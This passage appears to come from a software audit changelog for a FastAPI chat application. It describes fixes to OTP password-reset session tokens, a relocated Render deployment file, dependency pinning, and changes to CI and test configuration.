- **After:** sessions require `tv` and reject `purpose` and `scope` tokens (`app/auth/dependencies/core.py`). The OTP is never logged. OTP login returns the 2FA pending token for 2FA users, and mints `tv` otherwise. The UI never used OTP login, so no frontend change was needed.
- **Tests:** `tests/test_password_reset.py` (5; 4 fail on the old code), including the full OTP → reset → old session 401 → new password flow.

### BUG-063 · Render Blueprint in the wrong place
Render reads `render.yaml` only from the repository root, so `Backend/render.yaml` was never used. It now sits at the root with `rootDir: Backend`, pins Python 3.11.9 (what CI tests), sets `APP_ENV=production`, runs the pre-deploy gate before `uvicorn`, and lists every variable the backend reads. Checked by parsing the YAML and confirming its paths exist; it hasn't been applied on Render from here.

---

## Also changed (not bugs)

- `fastapi>=0.118` pinned: on 0.106–0.117, yield-dependencies close before a `StreamingResponse` runs, which would detach the DB session used to save streamed chats. On the installed 0.141 streaming persistence works (`test_streaming_happy_path_persists`); the pin prevents a regression on older installs. Not reproduced on an old version.
- Search results cached 10 minutes; image provider responses validated; code-workspace prompt asks for named fences.
- A blank `IMAGE_PROVIDER_URL=` / `SEARCH_CACHE_TTL_SECONDS=` (both introduced during this audit) now means "unset" (e02392c).
- Round 2: deleted the unused `components/ChatPanel.tsx`, which answered with a hard-coded mock reply (7ecf5f9). E2E tests now fail on any uncaught page error or unhandled rejection (20d95af). Playwright retries were removed from CI so flaky tests show up (7c21a76). The backend suite hashes test passwords at bcrypt cost 4 (94 s → 10 s); production stays at cost 12, which `test_production_password_hashing_uses_cost_12` asserts (5469216).
